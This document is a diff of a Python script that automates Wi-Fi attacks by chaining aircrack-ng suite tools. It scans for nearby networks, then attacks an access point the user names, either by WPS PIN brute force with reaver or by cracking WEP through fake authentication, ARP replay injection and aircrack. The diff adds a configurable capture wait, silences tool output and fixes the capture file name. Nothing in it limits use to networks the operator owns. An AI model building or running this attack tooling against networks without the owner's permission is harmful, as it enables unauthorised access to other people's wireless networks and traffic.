@@ -16,13 +16,14 @@ from re import sub
 from sys import argv
 from time import sleep
 from getopt import getopt
-from subprocess import PIPE, Popen
+from subprocess import STDOUT, DEVNULL, Popen
 from os import remove, path
 
 debug = 0
 showscan = 0
 washtime = 0
 scantime = 0
+craktime = 60
 iface = 'wlan0'
 
 DUMP_BSSID = 0
@@ -66,7 +67,7 @@ def parseopts():
 	global washtime
 	global showscan
 	dprint(repr(argv))
-	opts, lovr = getopt(argv[1:], 'vsi:a:r:')
+	opts, lovr = getopt(argv[1:], 'vsi:c:a:r:')
 	for opt, arg in opts:
 		if opt in ('-v'):
 			debug = 1
@@ -78,6 +79,8 @@ def parseopts():
 			scantime = int(arg)
 		elif opt in ('-r'):
 			washtime = int(arg)
+		elif opt in ('-c'):
+			craktime = int(arg)
 
 def dosep():
 	dprint('-' * 90, 1)
@@ -103,6 +106,7 @@ def runmain():
 	global iface
 	global scantime
 	global washtime
+	global craktime
 	global showscan
 	global DUMP_BSSID
 	global DUMP_ESSID
@@ -139,7 +143,7 @@ def runmain():
 		if (path.exists('quickscan-01.csv')):
 			remove(r'quickscan-01.csv')
 		dprint('Starting ' + AIRODUMP)
-		d = Popen([AIRODUMP, '--write', 'quickscan', '--output-format', 'csv', iface], shell=True, stderr=PIPE, stdout=PIPE, stdin=PIPE)
+		d = Popen([AIRODUMP, "--write", "quickscan", "--output-format", "csv", iface], stdout=DEVNULL, stderr=STDOUT)
 		dprint(AIRODUMP + ' scanning for ' + repr(scantime) + ' seconds...')
 		sleep(scantime)
 		dprint('Terminating ' + AIRODUMP)
@@ -148,7 +152,7 @@ def runmain():
 		if (path.exists('quickscan.wash')):
 			remove(r'quickscan.wash')
 		dprint('Starting ' + WASH)
-		d = Popen([WASH, '-C', '-o', 'quickscan.wash', '-i', iface], shell=True, stderr=PIPE, stdout=PIPE)
+		d = Popen([WASH, "-C", "-o", "quickscan.wash", "-i", iface], stdout=DEVNULL, stderr=STDOUT)
 		dprint(WASH + ' scanning for ' + repr(washtime) + ' seconds...')
 		sleep(washtime)
 		dprint('Terminating ' + WASH)
@@ -213,7 +217,7 @@ def runmain():
 				x = Popen([IWCONFIG, iface, 'channel', ap[washnames[WASH_CHANNEL]]])
 				x.wait()
 				dprint('Launching ' + REAVER + ', GLHF!', 1)
-				thereaver = Popen([REAVER, '-i', iface, '-b', ap[washnames[WASH_BSSID]], '-c', ap[washnames[WASH_CHANNEL]], '-vv'], shell=True)
+				thereaver = Popen([REAVER, "-vv", "-i", iface, "-b", ap[washnames[WASH_BSSID]], "-c", ap[washnames[WASH_CHANNEL]]], shell=True)
 				thereaver.wait()
 				return 0
 		dprint('Invalid ESSID selected, you MUST type this correctly. Aborting...', 1)
@@ -230,24 +234,30 @@ def runmain():
 		who2crak = input('Please enter the ESSID to attack: ').replace('\n', '').strip()
 		for ap in aptable:
 			if (ap[colnames[DUMP_ESSID]] == who2crak):
+				if (path.exists('crackscan-01.cap')):
+					remove(r'crackscan-01.cap')
+
 				dprint('Changing to channel ' + ap[colnames[DUMP_CHANNEL]])
 				h = Popen([IWCONFIG, iface, 'channel', ap[colnames[DUMP_CHANNEL]]])
 				h.wait()
 				dprint('Staring listener...')
-				i = Popen([AIRODUMP, '--write', 'crackscan', iface, '--bssid', ap[colnames[DUMP_BSSID]], '--channel', ap[colnames[DUMP_CHANNEL]]])
+				i = Popen([AIRODUMP, "--write", "crackscan", iface, "--bssid", ap[colnames[DUMP_BSSID]], "--channel", ap[colnames[DUMP_CHANNEL]]], stdout=DEVNULL, stderr=STDOUT)
 				dprint('Associating with the AP...')
-				j = Popen([AIREPLAY, '--fakeauth', '0', '-a', ap[colnames[DUMP_BSSID]], iface])
+				j = Popen([AIREPLAY, "--fakeauth", "0", iface, "-a", ap[colnames[DUMP_BSSID]]], stdout=DEVNULL, stderr=STDOUT)
+				j.wait()
 				dprint('Spamming AP with ARP packets...')
-				k = Popen([AIREPLAY, '--arpreplay', iface, '-b', ap[colnames[DUMP_BSSID]]])
-				dprint('Waiting 10 seconds...')
-				sleep(10)
+				k = Popen([AIREPLAY, "--arpreplay", iface, "-b", ap[colnames[DUMP_BSSID]]], stdout=DEVNULL, stderr=STDOUT)
+				dprint('Waiting ' + repr(craktime) + ' seconds...')
+				sleep(craktime)
 				dprint('Launching ' + AIRCRACK + ', GLHF!')
-				l = Popen([AIRCRACK, 'crackscan.cap'], shell=True, stderr=PIPE, stdout=PIPE, stdin=PIPE)
+				l = Popen(AIRCRACK + " crackscan-01.cap", shell=True)
 				l.wait()
 				dprint('Killing ' + AIREPLAY)
-				j.kill()
+				k.kill()
 				dprint('Killing ' + AIRODUMP)
 				i.kill()
+				dprint('Killing ' + AIRCRACK)
+				l.kill()
 				return 0;
 		dprint('Invalid ESSID selected, you MUST type this correctly. Aborting...', 1)
 		return 1
